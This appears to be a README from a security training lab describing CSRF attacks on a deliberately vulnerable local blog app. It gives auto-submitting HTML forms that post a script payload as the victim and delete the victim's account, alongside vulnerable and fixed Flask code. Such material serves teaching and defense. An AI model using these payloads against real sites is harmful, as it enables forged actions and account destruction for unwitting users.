# VulnBlog CSRF Exploits

## Overview
CSRF attacks on VulnBlog's post creation, comment submission, and account management.

## Target Application
- **App**: VulnBlog
- **Port**: 5001
- **Vulnerability**: Missing CSRF protection
- **Severity**: MEDIUM-HIGH

## Available Exploits

### 1. csrf_poc.html
CSRF proof-of-concept page.

**Usage**:
```bash
# Victim must be logged into VulnBlog
firefox csrf_poc.html
```

## Attack Vectors

```html
<!-- Create post as victim -->
<form action="http://localhost:5001/post/create" method="POST">
  <input name="title" value="Hacked Post">
  <input name="content" value="<script>alert('XSS')</script>">
</form>
<script>document.forms[0].submit()</script>

<!-- Delete account -->
<form action="http://localhost:5001/account/delete" method="POST">
  <input name="confirm" value="yes">
</form>
<script>document.forms[0].submit()</script>
```

## Testing

1. **Start VulnBlog**:
```bash
cd ../../projects/vulnblog
docker-compose up -d
```

2. **Login** to http://localhost:5001

3. **Execute**:
```bash
firefox csrf_poc.html
```

## Defense

**Vulnerable**:
```python
# No CSRF token validation!
@app.route('/post/create', methods=['POST'])
def create_post():
    title = request.form.get('title')
    # Creates post without CSRF check
```

**Fixed**:
```python
from flask_wtf.csrf import CSRFProtect

csrf = CSRFProtect(app)

@app.route('/post/create', methods=['POST'])
def create_post():
    # CSRF token automatically validated
    title = request.form.get('title')
```

## Notes
CSRF can modify blog content, delete posts, and change account settings.

## Related
- See `../../dsvpwa/csrf/` for comprehensive CSRF
- See `../../ecomstore/csrf/` for order CSRF

## References
- OWASP CSRF: https://owasp.org/www-community/attacks/csrf
